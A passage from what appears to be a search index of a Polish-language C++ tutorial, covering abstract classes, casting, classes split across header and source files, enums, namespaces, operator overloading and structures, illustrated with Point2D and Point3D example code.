abstrakcyjne","text":"<p>Cechy charakterystyczne klas abstrakcyjnych:</p> <ul> <li>Nie mo\u017cna tworzy\u0107 instancji klas abstrakcyjnych.</li> <li>Klasa posiadaj\u0105ca przynajmniej jedn\u0105 metod\u0119 w pe\u0142ni wirtualn\u0105 jest klas\u0105 abstrakcyjn\u0105.</li> </ul>"},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/#metody-w-peni-wirtualne","title":"Metody w pe\u0142ni wirtualne","text":"<p>Metoda w pe\u0142ni wirualne definiujemy za pomoc\u0105 modyfikatora virtual oraz przypisana do funkcji warto\u015bci 0;</p>"},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/#przykad","title":"Przyk\u0142ad","text":"<pre><code>virtual void translate(int k) = 0;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/abstract-class/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nclass Point {\n    public:\n\n    Point(){};\n    virtual void translate(int k) = 0;\n};\n\nclass Point2D: public Point {\n    int x, y;\n    public:\n    Point2D(int x, int y): x(x), y(y) {}\n\n    void translate(int k) {\n        x += k;\n        y += k;\n    }\n};\n\nint main() {\n    // Point point; // error\n    Point2D point2D(5, 8); // OK\n    Point *point; // OK\n    // point = new Point(); // error\n    point = new Point2D(5, 8); // OK\n    point-&gt;translate(10);\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/casting/","title":"Rzutowanie","text":""},{"location":"programming/c%2B%2B/introduction/oop/casting/#wstep","title":"Wst\u0119p","text":""},{"location":"programming/c%2B%2B/introduction/oop/casting/#przykad-relacja-klas","title":"Przyk\u0142ad - relacja klas","text":"<pre><code>class Point {\n    public:\n\n    Point(){};\n    virtual void translate(int k) = 0;\n    virtual void print() = 0;\n};\n\nclass Point2D: public Point {\n    int x, y;\n    public:\n    Point2D(int x, int y): x(x), y(y) {}\n\n    void translate(int k) {\n        x += k;\n        y += k;\n    }\n\n    void print() {\n        cout &lt;&lt; \"(\" &lt;&lt; x &lt;&lt; \",\" &lt;&lt; y &lt;&lt; \")\" &lt;&lt; endl;\n    }\n\n    void set(int x, int y) {\n        this-&gt;x = x;\n        this-&gt;y = y;\n    }\n};\n\nclass Point3D: public Point {\n    int x, y, z;\n    public:\n    Point3D(int x, int y, int z): x(x), y(y), z(z) {}\n\n    void translate(int k) {\n        x += k;\n        y += k;\n        z += k;\n    }\n\n    void print() {\n        cout &lt;&lt; \"(\" &lt;&lt; x &lt;&lt; \",\" &lt;&lt; y &lt;&lt; \",\" &lt;&lt; z &lt;&lt; \")\" &lt;&lt; endl;\n    }\n\n    void set(int x, int y, int z) {\n        this-&gt;x = x;\n        this-&gt;y = y;\n        this-&gt;z = z;\n    }\n};\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/casting/#rzutowanie-statyczne","title":"Rzutowanie statyczne","text":""},{"location":"programming/c%2B%2B/introduction/oop/casting/#przykad","title":"Przyk\u0142ad","text":"<pre><code>    Point *point;\n\n    point = new Point2D(1, 2);\n\n    // point-&gt;set(2, 5); // error\n    static_cast&lt;Point2D*&gt;(point)-&gt;set(2,5);\n\n    point-&gt;print();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/casting/#rzutowanie-dynamiczne","title":"Rzutowanie dynamiczne","text":""},{"location":"programming/c%2B%2B/introduction/oop/casting/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>    srand(time(NULL));\n\n    Point *point;\n\n    if(rand() % 2 == 0) {\n        point = new Point2D(1, 2);\n    } else {\n        point = new Point3D(1, 2 ,3);\n    }\n\n    if(auto p = dynamic_cast&lt;Point2D*&gt;(point)) {\n        p-&gt;set(8, 9);\n    }\n\n    if(auto p = dynamic_cast&lt;Point3D*&gt;(point)) {\n        p-&gt;set(4,5,6);\n    }\n\n    point-&gt;print();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/classes/","title":"Klasy","text":""},{"location":"programming/c%2B%2B/introduction/oop/classes/#wstep","title":"Wst\u0119p","text":"<p>W j\u0119zyku C++ definicj\u0119 klasy zaczynamy od s\u0142owa kluczowego <code>class</code>. W klasach, w przeciwie\u0144stwie do struktur, domy\u015blnym modyfikatorem dost\u0119pu jest <code>private</code>. Jak i w innych j\u0119zykach klasy mog\u0105 mie\u0107 swoje atrybuty i metody. Om\u00f3wimy dzia\u0142anie klas na konkretnym przyk\u0142adzie.</p>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#przykad-1-punkt2d","title":"Przyk\u0142ad 1: Punkt2D","text":"<p>Stw\u00f3rzmy klas\u0119 reprezentuj\u0105c\u0105 dwuwymiarowy punkt. Nazwiemy j\u0105 Point2D. Nasza klasa b\u0119dzie mia\u0142a dwa atrybuty: wsp\u00f3\u0142rz\u0119dne \\(x\\) i \\(y\\).</p>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nclass Point2D {\n  double x, y;\n\n  public:\n    Point2D() {\n      this-&gt;x = 0;\n      this-&gt;y = 0;\n    }\n\n    Point2D(double x, double y) {\n      this-&gt;x = x;\n      this-&gt;y = y;\n    }\n\n    double getX() {\n      return this-&gt;x;\n    }\n\n    void setX(double val) {\n      this-&gt; x = val;\n    }\n\n    double getY() {\n      return this-&gt;y;\n    }\n\n    void setY(double val) {\n      this-&gt;y = val;\n    }\n\n    void translate(Point2D translation) {\n      this-&gt;x += translation.x;\n      this-&gt;y += translation.y;\n    }\n\n    void rotate(double angle) {\n      double newX = this-&gt;x * cos(angle) - this-&gt;y * sin(angle);\n      double newY = this-&gt;x * sin(angle) + this-&gt;y * cos(angle);\n      this-&gt;x = newX;\n      this-&gt;y = newY;\n    }\n\n    void scale(double sc) {\n      this-&gt;x *= sc;\n      this-&gt;y *= sc;\n    }\n\n    void print() {\n      cout &lt;&lt; \"(\" &lt;&lt; this-&gt;x &lt;&lt; \", \" &lt;&lt; this-&gt;y &lt;&lt; \")\" &lt;&lt; endl;\n    }\n};\n\nint main() {\n  Point2D point = Point2D(3, 4);\n\n  point.print();\n\n  point.translate(Point2D(1, 1));\n\n  point.print();\n\n  point.scale(2);\n\n  point.print();\n\n  point.rotate(M_PI / 2);\n\n  point.print();\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#przykad-2-podzia-na-pliki","title":"Przyk\u0142ad 2: podzia\u0142 na pliki","text":"<p>Gdy nasza klasa b\u0119dzie obrasta\u0107 w nowe funkcjonalno\u015bci i metody, z czasem mo\u017ce sta\u0107 si\u0119 ma\u0142o czytelna. Dlatego dobrym pomys\u0142em jest oddzieli\u0107 deklaracj\u0119 klasy od jej implementacji. W ten spos\u00f3b uzyskujemy dwa pliki: plik nag\u0142\u00f3wkowy z rozszerzeniem .h oraz plik z implementacj\u0105 z rozszerzeniem .cpp. W pliku nag\u0142\u00f3wkowym zawieramy jedynie deklaracje atrybut\u00f3w i metod klasy, unikamy dodawania ich implementacji. Na implementacj\u0119 metod naszej klasy przeznaczony jest osobny plik.</p>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#point2dh","title":"Point2D.h","text":"<pre><code>#ifndef POINT2D_H\n#define POINT2D_H\n\n#include &lt;cmath&gt;\n#include &lt;iostream&gt;\n\nclass Point2D {\n  double x, y;\n\n  public:\n    Point2D();\n\n    Point2D(double x, double y);\n\n    double getX();\n\n    void setX(double val);\n\n    double getY();\n\n    void setY(double val);\n\n    void translate(Point2D translation);\n\n    void rotate(double angle);\n\n    void scale(double sc);\n\n    void print();\n};\n\n#endif //POINT2D_H\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#point2dcpp","title":"Point2D.cpp","text":"<pre><code>#include \"Point2D.h\"\n\nPoint2D::Point2D() {\n  this-&gt;x = 0;\n  this-&gt;y = 0;\n}\n\nPoint2D::Point2D(double x, double y) {\n  this-&gt;x = x;\n  this-&gt;y = y;\n}\n\ndouble Point2D::getX() {\n  return this-&gt;x;\n}\n\nvoid Point2D::setX(double val) {\n  this-&gt; x = val;\n}\n\ndouble Point2D::getY() {\n  return this-&gt;y;\n}\n\nvoid Point2D::setY(double val) {\n  this-&gt;y = val;\n}\n\nvoid Point2D::translate(Point2D translation) {\n  this-&gt;x += translation.x;\n  this-&gt;y += translation.y;\n}\n\nvoid Point2D::rotate(double angle) {\n  double newX = this-&gt;x * cos(angle) - this-&gt;y * sin(angle);\n  double newY = this-&gt;x * sin(angle) + this-&gt;y * cos(angle);\n  this-&gt;x = newX;\n  this-&gt;y = newY;\n}\n\nvoid Point2D::scale(double sc) {\n  this-&gt;x *= sc;\n  this-&gt;y *= sc;\n}\n\nvoid Point2D::print() {\n  std::cout &lt;&lt; \"(\" &lt;&lt; this-&gt;x &lt;&lt; \", \" &lt;&lt; this-&gt;y &lt;&lt; \")\" &lt;&lt; std::endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#maincpp","title":"main.cpp","text":"<pre><code>#include \"Point2D.h\"\n\nint main() {\n  Point2D point = Point2D(3, 4);\n\n  point.print();\n\n  point.translate(Point2D(1, 1));\n\n  point.print();\n\n  point.scale(2);\n\n  point.print();\n\n  point.rotate(M_PI / 2);\n\n  point.print();\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/classes/#kompilacja","title":"Kompilacja","text":"<pre><code>g++ -o main Point2D.cpp main.cpp\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/enum/","title":"Enumeracje","text":""},{"location":"programming/c%2B%2B/introduction/oop/enum/#wstep","title":"Wst\u0119p","text":"<p>Enumeracja to specjalny rodzaj struktury danych. Pozwala nam na zdefiniowanie pewnej listy nazw, kt\u00f3re p\u00f3\u017aniej mo\u017cemy interpretowa\u0107 jako warto\u015bci liczbowe. Najlepiej to om\u00f3wi\u0107 na przyk\u0142adzie.</p>"},{"location":"programming/c%2B%2B/introduction/oop/enum/#przykad","title":"Przyk\u0142ad","text":"<p>Rozwa\u017cmy sytuacje, w kt\u00f3rej tworzymy aplikacj\u0119 webow\u0105 obs\u0142uguj\u0105c\u0105 konta u\u017cytkownik\u00f3w o r\u00f3\u017cnym poziomie dost\u0119pu. Mo\u017cemy mie\u0107 zwyk\u0142ego u\u017cytkownika, kt\u00f3ry ma dost\u0119p tylko do podstawowych funkcjonalno\u015bci, ale tak\u017ce moderatora i administratora. Ka\u017cdy z nich b\u0119dzie mia\u0142 inne uprawnienia i ich role musz\u0105 by\u0107 brane pod uwag\u0119 w wielu miejscach naszej implementacji. W tym celu utworzymy enumeracj\u0119 tych r\u00f3l.</p>"},{"location":"programming/c%2B%2B/introduction/oop/enum/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nenum role {\n  user, moderator, admin\n};\n\nint main() {\n  role currentRole = role::admin;\n\n  switch(currentRole) {\n    case user:\n      std::cout &lt;&lt; \"User role: \" &lt;&lt; currentRole &lt;&lt; std::endl;\n      break;\n    case moderator:\n      std::cout &lt;&lt; \"Moderator role: \" &lt;&lt; currentRole &lt;&lt; std::endl;\n      break;\n    case admin:\n      std::cout &lt;&lt; \"Admin role: \" &lt;&lt; currentRole &lt;&lt; std::endl;\n      break;\n  }\n\n  return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/enum/#opis","title":"Opis","text":"<p>Na pocz\u0105tku tworzymy enumeracj\u0119 roli: <code>enum role</code>. Nast\u0119pnie w kodzie g\u0142\u00f3wnym przypisujemy wybran\u0105 rol\u0119 do zmiennej <code>currentRole</code>. Dzi\u0119ki wykorzystaniu enumeracji mo\u017cemy w prosty i czytelny spos\u00f3b skorzysta\u0107 z operacji <code>switch</code> i uzale\u017cni\u0107 dzia\u0142anie programu od przypisanej roli. Po uruchomieniu programu mo\u017cna zaobserwowa\u0107, \u017ce do ka\u017cdej zdefiniowanej przez nas roli zosta\u0142a przypisana liczba ca\u0142kowita, poniewa\u017c domy\u015blnie pod enumeracjami kryj\u0105 si\u0119 w\u0142a\u015bnie kolejne liczby ca\u0142kowite. Tak wi\u0119c nasza rola user ma przypisan\u0105 warto\u015b\u0107 \\(0\\), moderator ma warto\u015b\u0107 \\(1\\), a admin ma warto\u015b\u0107 \\(2\\).</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/","title":"Przestrzenie nazw","text":""},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#wstep","title":"Wst\u0119p","text":"<p>Przestrzenie nazw (ang. namespace) w j\u0119zyku C++ pozwalaj\u0105 na lepsz\u0105 organizacj\u0119 kodu. Dzi\u0119ki zastosowaniu przestrzeni nazw, mo\u017cemy wydzieli\u0107 fragment implementacji w postaci sp\u00f3jnego w semantycznym znaczeniu lub przeznaczeniu bloku. Pozwala to nam mi\u0119dzy innymi na u\u017cywanie funkcji, klas o tych samych nazwach, ale r\u00f3\u017cnym znaczeniu i umieszczenie ich w r\u00f3\u017cnych przestrzeniach nazw. Jest to tak\u017ce dobry spos\u00f3b na upewnienie si\u0119, \u017ce tworzona przez nas biblioteka nie spowoduje konfliktu nazw, gdy zostanie u\u017cyta w innym projekcie.</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Rozwa\u017cmy bardzo prosty, a nawet naiwny przyk\u0142ad.  Mamy dwie funkcje, kt\u00f3rych zadaniem jest wy\u015bwietlenie komunikatu \"pomocy\". Jedna z nich dotyczy biblioteki, kt\u00f3r\u0105 tworzymy do obs\u0142ugi u\u0142amk\u00f3w, a druga dotyczy biblioteki liczb zespolonych. Mo\u017cemy oczywi\u015bcie nazwa\u0107 je np. helpFractions i helpComplex, ale lepiej b\u0119dzie u\u017cywa\u0107 sp\u00f3jnych nazw w ka\u017cdej bibliotece. Tutaj z pomoc\u0105 przychodz\u0105 nam w\u0142a\u015bnie przestrzenie nazw.</p> <pre><code>#include &lt;iostream&gt;\n\nnamespace fractions {\n    void help() {\n        std::cout &lt;&lt; \"Help for fractions\" &lt;&lt; std::endl;\n    }\n}\n\nnamespace complex {\n    void help() {\n        std::cout &lt;&lt; \"Help for complex numbers\" &lt;&lt; std::endl;\n    }\n}\n\nint main() {\n\n    fractions::help();\n\n    complex::help();\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Przestrzenie nazw mo\u017cemy bez problemu rozbija\u0107 na wiele definicji, dzi\u0119ki czemu mog\u0105 by\u0107 u\u017cywane w wielu plikach bez obaw o nadpisanie.</p> <pre><code>#include &lt;iostream&gt;\n\nnamespace messages {\n  void hello() {\n    std::cout &lt;&lt; \"Hello World!\" &lt;&lt; std::endl;\n  }\n}\n\nnamespace messages{\n  void warning() { \n    std::cout &lt;&lt; \"WARNING!\" &lt;&lt; std::endl;\n  }\n}\n\nint main() {\n\n  messages::hello();\n  messages::warning();\n\n  return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#uzywanie-przestrzeni-nazw","title":"U\u017cywanie przestrzeni nazw","text":"<p>Czasem chcemy korzysta\u0107 z przestrzeni nazw bez podawania jej nazwy przy ka\u017cdym wywo\u0142aniu. Do tego s\u0142u\u017cy nam polecenie using namespace. Za pomoc\u0105 tego polecenia mo\u017cemy \"w\u0142\u0105czy\u0107\" ca\u0142\u0105 przestrze\u0144 nazw do obecnego pliku.</p> <p>Bywa jednak te\u017c tak, \u017ce nie potrzebujemy ca\u0142ej przestrzeni nazw, a jedynie jej fragment, np. konkretn\u0105 funkcj\u0119. Wtedy mo\u017cemy skorzysta\u0107 z samego polecenia using. </p> <p>Przyjrzyjmy si\u0119 poni\u017cszym przyk\u0142adom.</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#przykad-1_1","title":"Przyk\u0142ad 1","text":"<pre><code>#include &lt;iostream&gt;\n\nnamespace fractions {\n    void help() {\n        std::cout &lt;&lt; \"Help for fractions\" &lt;&lt; std::endl;\n    }\n}\n\nnamespace complex {\n    void help() {\n        std::cout &lt;&lt; \"Help for complex numbers\" &lt;&lt; std::endl;\n    }\n}\n\nusing namespace fractions;\n\nint main() {\n\n    help();\n\n    complex::help();\n\n    return 0;\n}\n</code></pre> <p>W powy\u017cszej implementacji niejako \"za\u0142\u0105czamy\" przestrze\u0144 nazw fractions za pomoc\u0105 polecenia <code>using namespace fractions;</code>. Dzi\u0119ki temu, aby wywo\u0142a\u0107 funkcj\u0119 help z przestrzeni fractions nie trzeba ju\u017c podawa\u0107 nazwy tej przestrzeni nazw. Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce przestrze\u0144 nazw musi by\u0107 wcze\u015bniej zdefiniowana.</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#przykad-2_1","title":"Przyk\u0142ad 2","text":"<pre><code>#include &lt;iostream&gt;\n\nusing std::cout, std::endl;\n\nnamespace fractions {\n    void help() {\n        cout &lt;&lt; \"Help for fractions\" &lt;&lt; endl;\n    }\n}\n\nnamespace complex {\n    void help() {\n        cout &lt;&lt; \"Help for complex numbers\" &lt;&lt; endl;\n    }\n}\n\nint main() {\n\n    fractions::help();\n\n    complex::help();\n\n    return 0;\n}\n</code></pre> <p>W tym przyk\u0142adnie u\u017cywamy dw\u00f3ch polece\u0144 z przestrzeni std: cout i endl. Nie musimy wi\u0119c za\u0142\u0105cza\u0107 ca\u0142ej przestrzeni std, tak jak to cz\u0119sto robimy. Wystarcz\u0105 nam jej dwa sk\u0142adniki, kt\u00f3re za\u0142\u0105czamy za pomoc\u0105 polecenia <code>using std::cout, std::endl</code>.</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#zagniezdzanie","title":"Zagnie\u017cd\u017canie","text":"<p>Przestrzenie nazw mo\u017cemy tak\u017ce bez problemu zagnie\u017cd\u017ca\u0107. Sp\u00f3jrzmy na poni\u017cszy przyk\u0142ad.</p>"},{"location":"programming/c%2B%2B/introduction/oop/namespaces/#przykad","title":"Przyk\u0142ad","text":"<pre><code>#include &lt;iostream&gt;\n\nnamespace numbers {\n\n  namespace fractions {\n      void help() {\n          std::cout &lt;&lt; \"Help for fractions\" &lt;&lt; std::endl;\n      }\n  }\n\n  namespace complex {\n      void help() {\n          std::cout &lt;&lt; \"Help for complex numbers\" &lt;&lt; std::endl;\n      }\n  }\n\n}\n\nint main() {\n\n    numbers::fractions::help();\n\n    numbers::complex::help();\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/","title":"Przeci\u0105\u017canie operator\u00f3w","text":""},{"location":"programming/c%2B%2B/introduction/oop/operators/#wstep","title":"Wst\u0119p","text":"<p>Na nowo zdefiniowanych w\u0142asnych typach przeprowadzamy r\u00f3\u017cne operacje. Cz\u0119sto s\u0105 to tak\u017ce standardowe operacje arytmetyczne, jak np. dodanie do siebie wsp\u00f3\u0142rz\u0119dnych dw\u00f3ch punkt\u00f3w. W takich sytuacjach wygodniej jest korzysta\u0107 z predefiniowanych operator\u00f3w, takich jak operator dodawania \\(+\\) zamiast z metod typu <code>add</code>.</p> <p>Wyobra\u017amy sobie, \u017ce mamy dwie zmienne (obiekty) reprezentuj\u0105ce punkty: <code>p1</code> oraz <code>p2</code>.  Chcemy doda\u0107 wsp\u00f3\u0142rz\u0119dne jednego punktu do drugiego i wynik zapisa\u0107 w zmiennej <code>p1</code>. Zazwyczaj zapisaliby\u015bmy co\u015b w stylu <code>p1.Add(p2)</code>. U\u017cywaj\u0105c jednak przeci\u0105\u017cenia operator\u00f3w mo\u017cemy zapisa\u0107 <code>p1 = p1 + p2</code>.</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#dokumentacja","title":"Dokumentacja","text":"<p>operatory - dokumentacja</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#przykad-dodawanie-punktow","title":"Przyk\u0142ad: dodawanie punkt\u00f3w","text":"<p>Operator dodawania \\(+\\) jest jednym ze standardowych operator\u00f3w dwuargumentowych. Oznacza to, \u017ce dzia\u0142a na dw\u00f3ch argumentach, a jego wynikiem jest nowa warto\u015b\u0107. Przeci\u0105\u017caj\u0105c ten operator nie powinni\u015bmy modyfikowa\u0107 obecnego obiektu, ale utworzy\u0107 nowy i zwr\u00f3ci\u0107 go jako wynik.</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#point2d","title":"Point2D","text":"<pre><code>Point2D operator+(const Point2D &amp;other) {\n  return Point2D(this-&gt;x + other.x, this-&gt;y + other.y);\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#main","title":"main","text":"<pre><code>Point2D p1 = Point2D(3, 4);\nPoint2D p2 = Point2D(1, 9);\n\nauto p3 = p1 + p2;\n\np3.print();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#przykad-wypisanie-punktu","title":"Przyk\u0142ad: wypisanie punktu","text":"<p>Mo\u017cemy przeci\u0105\u017ca\u0107 nie tylko operatory arytmetyczne, ale tak\u017ce operatory strumieniowe. W ten spos\u00f3b mo\u017cemy sami zdefiniowa\u0107, w jaki spos\u00f3b nasz obiekt ma zosta\u0107 wypisany, lub wczytany.</p> <p>W przeciwie\u0144stwie do operator\u00f3w arytmetycznych, ten nie jest definiowany jako cz\u0119\u015b\u0107 implementacji klasy, ale jako funkcja zaprzyja\u017aniona (ang. friend).</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#point2d_1","title":"Point2D","text":"<pre><code>std::ostream&amp; operator&lt;&lt;(std::ostream &amp;out, const Point2D &amp;point)\n{\n    out &lt;&lt; \"(\" &lt;&lt; point.x &lt;&lt; \",\" &lt;&lt; point.y &lt;&lt; \")\";\n    return out;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#main_1","title":"main","text":"<pre><code>std::cout &lt;&lt; p3 &lt;&lt; std::endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#przykad-wczytanie-punktu","title":"Przyk\u0142ad: wczytanie punktu","text":"<p>Przeci\u0105\u017canie operatora strumieniowego wej\u015bcia wygl\u0105da podobnie, jak przy operatorze wej\u015bcia.</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#point2d_2","title":"Point2D","text":"<pre><code>std::istream&amp; operator&gt;&gt;(std::istream &amp;in, Point2D &amp;point)\n{\n    in &gt;&gt; point.x &gt;&gt; point.y;\n    return in;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#main_2","title":"main","text":"<pre><code>std::cin &gt;&gt; p3;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#przykad-operator-indeksowania","title":"Przyk\u0142ad: operator indeksowania","text":"<p>Mo\u017cemy tak\u017ce przeci\u0105\u017cy\u0107 operator indeksowania, czy te\u017c operator nawias\u00f3w kwadratowych []. Jest to szczeg\u00f3lnie przydatne, gdy tworzymy w\u0142asn\u0105 implementacj\u0119 jakiego\u015b zbioru.</p>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#point2d_3","title":"Point2D","text":"<pre><code>double Point2D::operator[](int index) {\n  if(index == 0) {\n    return this-&gt;x;\n  } else if(index == 1) {\n    return this-&gt;y;\n  } else {\n    throw std::out_of_range(\"Index should be 0 or 1\");\n  }\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/operators/#main_3","title":"main","text":"<pre><code>  std::cout &lt;&lt; point3[0] &lt;&lt; std::endl;\n\n  std::cout &lt;&lt; point3[2] &lt;&lt; std::endl;\n</code></pre> <p>Pr\u00f3ba wypisania warto\u015bci pod indeksem \\(2\\) zako\u0144czy si\u0119 b\u0142\u0119dem.</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/","title":"Struktury","text":""},{"location":"programming/c%2B%2B/introduction/oop/structures/#wstep","title":"Wst\u0119p","text":"<p>Z czasem, gdy zaczynamy tworzy\u0107 coraz bardziej zaawansowane projekty programistyczne, zaczyna si\u0119 okazywa\u0107, \u017ce podstawowe typy przestaj\u0105 wystarcza\u0107. Nasz kod staje si\u0119 coraz mniej czytelny i coraz trudniej si\u0119 w nim zorientowa\u0107, poniewa\u017c mamy grupy zmiennych, kt\u00f3re dotycz\u0105 tak naprawd\u0119 jednego \"obiektu\". Dla przyk\u0142adu wyobra\u017amy sobie, \u017ce piszemy program, kt\u00f3ry wykonuje obliczenia geometryczne i pracuje na punktach. Ka\u017cdy punkt jest reprezentowany przez dwie wsp\u00f3\u0142rz\u0119dne: \\(x\\) i \\(y\\). Potrzebujemy wi\u0119c dw\u00f3ch zmiennych do reprezentacji ka\u017cdego punktu. To ju\u017c samo w sobie mo\u017ce okaza\u0107 si\u0119 problematyczne, w szczeg\u00f3lno\u015bci, gdy b\u0119dziemy potrzebowali tablicy takich punkt\u00f3w. Co wtedy zrobi\u0107? Stworzy\u0107 dwie tablice, jedn\u0105 do wsp\u00f3\u0142rz\u0119dnych \\(x\\), drug\u0105 do wsp\u00f3\u0142rz\u0119dnych \\(y\\) i na nich pracowa\u0107? Trzeba wtedy pami\u0119ta\u0107 o tym, \u017ce warto\u015bci z dw\u00f3ch tablic s\u0105 ze sob\u0105 powi\u0105zane, wi\u0119c jak np. chcemy zmieni\u0107 ich kolejno\u015b\u0107, to powinni\u015bmy to zrobi\u0107 w dw\u00f3ch tablicach. Mo\u017cemy te\u017c skorzysta\u0107 z pary (<code>pair</code>) z STL, ale to tak\u017ce nie jest idealne rozwi\u0105zanie.</p> <p>W takiej sytuacji z pomoc\u0105 przychodz\u0105 struktury. Struktury (w du\u017cym skr\u00f3cie) pozwalaj\u0105 nam definiowa\u0107 w\u0142asne typy i przydaj\u0105 si\u0119 przede wszystkim w sytuacjach, gdy potrzebujemy po\u0142\u0105czy\u0107 grup\u0119 warto\u015bci w jedn\u0105, logiczn\u0105 ca\u0142o\u015b\u0107. Przyjrzyjmy si\u0119 poni\u017cszym przyk\u0142adom.</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#przykad-1-punkt-2d","title":"Przyk\u0142ad 1: punkt 2D","text":"<p>Zacznijmy od prostego przyk\u0142adu punktu.  Zdefiniujemy struktur\u0119 <code>Point</code>, kt\u00f3ra b\u0119dzie przechowywa\u0107 dwie warto\u015bci ca\u0142kowite: wsp\u00f3\u0142rz\u0119dne punktu.</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstruct Point {\n    int x;\n    int y;\n};\n\nint main() {\n    Point point;\n\n    cout &lt;&lt; \"Creating new point with x = 5 and y = 3\" &lt;&lt; endl;\n    point = {5, 3};\n\n    cout &lt;&lt; \"Point x: \" &lt;&lt; point.x &lt;&lt; endl;\n    cout &lt;&lt; \"Point y: \" &lt;&lt; point.y &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Assigning new values to the point variable\" &lt;&lt; endl;\n    point.x = 20;\n    point.y = 13;\n    cout &lt;&lt; \"Point x: \" &lt;&lt; point.x &lt;&lt; endl;\n    cout &lt;&lt; \"Point y: \" &lt;&lt; point.y &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#link-do-implementacji","title":"Link do implementacji","text":"<p>Struktura Point</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#opis-implementacji","title":"Opis implementacji","text":"<p>Zaczynamy od zdefiniowania w\u0142asnej struktury <code>Point</code> (linia 5). Definicj\u0119 struktury zaczynamy od s\u0142owa kluczowego <code>struct</code>, nast\u0119pnie podajemy jej nazw\u0119 i otwieramy blok kodu.</p> <p>W ciele struktury definiujemy dwie zmienne ca\u0142kowite do przechowywania wsp\u00f3\u0142rz\u0119dnych punktu: <code>x</code> (linia 6) oraz <code>y</code> (linia 7). Dla czytelno\u015bci robimy to w dw\u00f3ch osobnych liniach, nic nie stoi jednak na przeszkodzie, by zdefiniowa\u0107 obie zmienne jedna po drugiej, po przecinku.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na samym pocz\u0105tku tworzymy zmienn\u0105 point korzystaj\u0105c z wcze\u015bniej zdefiniowanego nowego typu Point (linia 10).</p> <p>W celu przypisania warto\u015bci do naszej zmiennej mo\u017cemy post\u0105pi\u0107 na dwa sposoby: * Korzystaj\u0105c z notacji nawias\u00f3w klamrowych, poda\u0107 warto\u015bci kolejnych zmiennych po przecinku (linia 13), * Przypisa\u0107 warto\u015bci do ka\u017cdej zmiennej osobno (linie 19 i 20).</p> <p>Aby dosta\u0107 si\u0119 do element\u00f3w naszej zmiennej typu <code>Point</code> u\u017cywamy zapisu z kropk\u0105, np. <code>point.x</code>. Gdyby nasza zmienna <code>point</code> by\u0142a wska\u017anikiem, zamiast kropki u\u017cyliby\u015bmy strza\u0142ki: <code>point-&gt;x</code>.</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#przykad-2-punkt-3d","title":"Przyk\u0142ad 2: punkt 3D","text":"<p>Rozbudujmy poprzedni przyk\u0142ad i stw\u00f3rzmy struktur\u0119 do reprezentacji punktu w przestrzeni 3D. Tym razem, zamiast warto\u015bci ca\u0142kowitych, u\u017cyjemy warto\u015bci rzeczywistych. Dodatkowo, aby u\u0142atwi\u0107 sobie \u017cycie, dopiszemy metod\u0119 do wypisywania informacji na temat punktu do konsoli. Tak, do struktur mo\u017cemy tak\u017ce dopisywa\u0107 metody: funkcje przypisane do struktury, kt\u00f3re mog\u0105 korzysta\u0107 z jej 